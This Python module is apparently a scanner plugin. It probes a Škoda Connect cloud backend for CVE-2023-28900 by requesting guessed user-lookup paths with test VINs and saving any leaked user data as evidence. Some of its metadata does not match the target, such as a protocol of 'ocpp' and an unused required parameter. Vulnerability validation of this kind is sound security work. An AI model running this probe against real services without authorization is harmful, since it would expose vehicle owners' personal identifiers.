#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))
from probe_utils import HTTPProbe, detection_confidence, service_open

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


VULN = {
    "id": 53,
    "cve": "CVE-2023-28900",
    "year": 2023,
    "domain": "IVI/云端/EVSE/OS",
    "vendor_product": "Škoda Connect cloud",
    "component": "VIN-to-user backend API",
    "type": "越权/信息泄露",
    "summary": "通过任意VIN可获得Skoda Connect用户昵称与标识符。",
    "source_description": "The Skoda Automotive cloud contains a Broken Access Control vulnerability, allowing to obtain nicknames and other user identifiers of Skoda Connect service users by specifying an arbitrary vehicle VIN number.",
    "poc_status": "公开公告；大多未见一步式PoC",
    "research_value": "作为近两年前后演进基线，对比2024-2026风险变化。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28900",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2023-28900",
        "https://asrg.io/security-advisories/cve-2023-28900",
        "https://cveawg.mitre.org/api/cve/CVE-2023-28900"
    ],
    "affected": [
        {
            "vendor": "Škoda Auto",
            "product": "Škoda Connect",
            "versions": [
                {
                    "version": "0",
                    "status": "affected"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2023-28900",
        "koda",
        "Connect",
        "cloud",
        "VIN-to-user",
        "backend",
        "API",
        "Skoda",
        "Automotive",
        "contains",
        "Broken",
        "Access",
        "Control",
        "vulnerability",
        "allowing",
        "obtain",
        "nicknames",
        "other",
        "user",
        "identifiers",
        "service",
        "users",
        "specifying",
        "arbitrary",
        "number",
        "Škoda Auto",
        "Škoda Connect"
    ]
}



def _run_poc(plugin) -> dict:
    """Probe CVE-2023-28900: Skoda Connect VIN-based IDOR user info leak."""
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 443))
    tls = bool(params.get("tls", True))

    evidence = {
        "cve": "CVE-2023-28900",
        "target": f"{target_ip}:{port}",
        "technique": "HTTP behavioral probe - Skoda Connect VIN-based IDOR user info exposure",
    }

    active_port = None
    for try_port in [port, 443, 80, 8080, 8443]:
        if service_open(target_ip, try_port):
            active_port = try_port
            tls = try_port in (443, 8443)
            break

    if active_port is None:
        evidence["service_open"] = False
        return {
            "vulnerable": None,
            "evidence": evidence,
            "detection_confidence": detection_confidence("E", evidence, "no_service"),
            "requires_manual_review": True,
        }

    evidence["service_open"] = True
    evidence["actual_port"] = active_port
    probe = HTTPProbe(target_ip, active_port, tls=tls, headers={"Accept": "application/json"})

    test_vins = ["TMBJB9NE0L0000001", "WVWZZZAUZLP000001", "TMBCK7NE0L0000001"]
    idor_paths_tmpl = [
        "/api/v1/user/{vin}",
        "/api/vehicle/{vin}/user",
        "/connect/vehicle/{vin}",
        "/api/users?vin={vin}",
    ]

    for vin in test_vins[:1]:
        for tmpl in idor_paths_tmpl:
            path = tmpl.format(vin=vin)
            r = probe.get(path)
            status = r.get("status")
            evidence[f"idor_{vin[:8]}_{path.strip('/').replace('/', '_')[:20]}_status"] = status
            if status == 200:
                body = r.get("body_text", "")
                if any(kw in body.lower() for kw in ["nickname", "user", "name", "email", "identifier"]):
                    evidence["idor_leak_detected"] = path
                    evidence["idor_vin_used"] = vin
                    evidence["leak_body_preview"] = body[:300]
                    return {
                        "vulnerable": True,
                        "evidence": evidence,
                        "detection_confidence": detection_confidence("B", evidence, "idor_user_info_leaked"),
                        "requires_manual_review": False,
                    }

    evidence["idor_paths_tested"] = [tmpl.format(vin=test_vins[0]) for tmpl in idor_paths_tmpl]
    return {
        "vulnerable": None,
        "evidence": evidence,
        "detection_confidence": detection_confidence("B", evidence, "idor_probe_no_leak"),
        "requires_manual_review": True,
    }

class Poc46CVE202328900ExposureAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-NET-046"
    meta_poc_name = 'CVE-2023-28900 信息泄露 Active Validation'
    meta_cve_id = 'CVE-2023-28900'
    meta_severity = 'Medium'
    meta_protocol = 'ocpp'
    meta_target_os = ['all']
    meta_required_params = ['service_banner']
    meta_profiles = ['network']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2023-28900'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2023-28900']
    meta_attack_surface = '网络服务'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "46_Skoda_Connect_VIN_User_Info_Leak_Audit") if "VULN" in dir() else "46_Skoda_Connect_VIN_User_Info_Leak_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc46CVE202328900ExposureAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
